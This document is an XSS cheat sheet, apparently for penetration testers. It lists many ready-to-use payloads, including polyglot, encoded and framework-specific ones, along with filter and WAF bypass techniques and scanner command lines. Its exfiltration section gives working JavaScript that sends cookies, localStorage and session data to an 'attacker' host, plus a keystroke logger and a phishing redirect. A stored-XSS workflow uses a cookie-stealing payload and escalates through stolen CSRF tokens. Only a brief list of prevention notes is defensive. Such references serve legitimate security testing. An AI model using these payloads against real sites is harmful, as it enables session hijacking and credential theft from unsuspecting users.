# Cross-Site Scripting (XSS)

XSS allows injection of client-side scripts into pages viewed by others. Types: Reflected, Stored, DOM-based. Impacts: cookie theft, keylogging, phishing, session hijack, defacement, CSRF chaining.

## Basic Payloads

| Payload | Context / Use |
|---------|---------------|
| `<script>alert(document.domain)</script>` | Classic |
| `<img src=x onerror=alert(document.domain)>` | Attribute / no script tag |
| `<svg onload=alert(1)>` | SVG context |
| `"><script>alert(1)</script>` | Break out of attribute |
| `javascript:alert(1)` | href / src contexts |
| `<script>new Image().src='//attacker/?c='+document.cookie</script>` | Cookie exfil |

## Advanced & Polyglot (2026)

```html
<script>alert(window.origin)</script>
<svg><script>alert&#40;1&#41;</script>
<img src=1 onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
"><svg/onload=alert`1`>
```

DOM XSS:
```js
location.hash; // #<img src=1 onerror=alert(1)>
document.write, innerHTML, eval on user input
```

## Filter & WAF Bypass Techniques

- Case variation: `<ScRiPt>`
- Encoding: HTML entities, URL, Unicode, double encoding
- Tag / attr alternatives: `<img>`, `<svg>`, `<details open ontoggle=alert(1)>`, `<marquee>`
- JS alternatives: `onerror`, `onload`, `onfocus`, `onmouseenter`
- Template literals / backticks for quotes
- Alternative execution: `setTimeout`, `Function`, `import()`

Example encoded:
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

## Tools

| Tool | Notes |
|------|-------|
| Dalfox | Fast, modern XSS scanner (recommended 2026) |
| XSStrike (legacy) | `python xsstrike.py -u "http://target/?q=test"` |
| Burp: DOM Invader | Excellent for DOM XSS hunting |
| Nuclei templates: `http/xss/` | Quick template scans |
| `ffuf` + custom payload list for param discovery |  |

```bash
# Example Dalfox
dalfox url "http://target/vuln?q=1" --waf-evasion
```

## Exfiltration & Impact

```js
// Cookie / localStorage
new Image().src = `//attacker/log?c=${document.cookie}&ls=${localStorage.token}`

// Keylogger simple
document.onkeypress = e => new Image().src = '//attacker/k?c='+e.key

// Redirect / phishing
window.location = '//attacker/phish'

// Full session theft + screenshot (advanced)
fetch('https://attacker/log', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    local: localStorage,
    session: sessionStorage,
    origin: window.origin
  })
});
```

## More Payload Examples (Context-Specific)

**Reflected in attribute:**
```html
" autofocus onfocus=alert(1) x="
```

**Inside <script> tag or JS context:**
```html
</script><script>alert(1)</script>
';alert(1);//
```

**JSON response reflected (DOM XSS):**
```js
{"user":"<img src=1 onerror=alert(1)>"}
```

**Angular / React contexts:**
```html
{{constructor.constructor('alert(1)')()}}
{{7*7}}   <!-- template injection leading to XSS -->
```

**SVG + XML contexts:**
```html
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

**Polyglot payload (works in many contexts):**
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Stored XSS Workflow Example

1. Find stored input (comment, profile bio, filename).
2. Submit payload: `<img src=x onerror="new Image().src='//attacker/?c='+document.cookie">`
3. Victim/admin views page → callback received.
4. Escalate: steal CSRF token + perform actions via fetch/XHR.

## Full Tool Usage Examples

```bash
# Dalfox with cookie + custom payload file + proxy
dalfox url "https://target/search?q=1" \
  -C "PHPSESSID=abc123" \
  -p "https://target/search?q=" \
  -w custom-xss.txt --waf-evasion --format json -o dalfox.json

# Nuclei XSS scan on live hosts
cat live-hosts.txt | nuclei -t http/xss/ -severity medium,high,critical -o xss.txt

# ffuf for XSS parameter discovery then test manually
ffuf -w params.txt:FUZZ -u "https://target/page?FUZZ=test" -mc 200 -mr "test" | \
  while read p; do dalfox url "${p/test/}<script>alert(1)</script>"; done
```

## Prevention Notes (for defenders)

- Output encoding (context-aware)
- Content-Security-Policy (CSP) — report-uri, strict-dynamic
- HttpOnly + Secure cookies
- Sanitizers (DOMPurify)
- Trusted Types (modern browsers)

References: PortSwigger XSS cheat sheet, OWASP XSS, PayloadsAllTheThings, HackTricks.
